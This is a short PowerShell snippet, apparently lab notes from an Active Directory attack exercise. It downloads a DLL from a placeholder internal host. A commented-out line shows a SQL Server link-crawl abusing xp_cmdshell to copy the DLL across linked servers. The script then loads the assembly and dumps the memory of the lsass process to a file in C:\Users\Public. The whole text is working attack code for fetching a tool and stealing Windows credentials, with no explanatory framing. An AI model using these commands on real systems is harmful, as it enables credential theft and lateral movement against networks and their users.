Invoke-WebRequest -UseBasicParsing -Uri "http://172.16.100.X/minidumpdotnet.dll" -OutFile "C:\Users\Public\minidumpdotnet.dll"


#Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''xcopy \\dcorp-stdX.dollarcorp.moneycorp.local\studentshareX\minidumpdotnet.dll C:\Users\Public''' -QueryTarget eu-sqlX

[string]$assemblyPath = "C:\Users\Public\minidumpdotnet.dll"
Add-Type -Path $assemblyPath
[MeeniDum.MeeniDum]$b = New-Object -TypeName 'MeeniDum.MeeniDum'
$LPid = (Get-Process -Name lsass).Id
$b.DumpPid($LPid, "C:\Users\Public\reverse.dmp")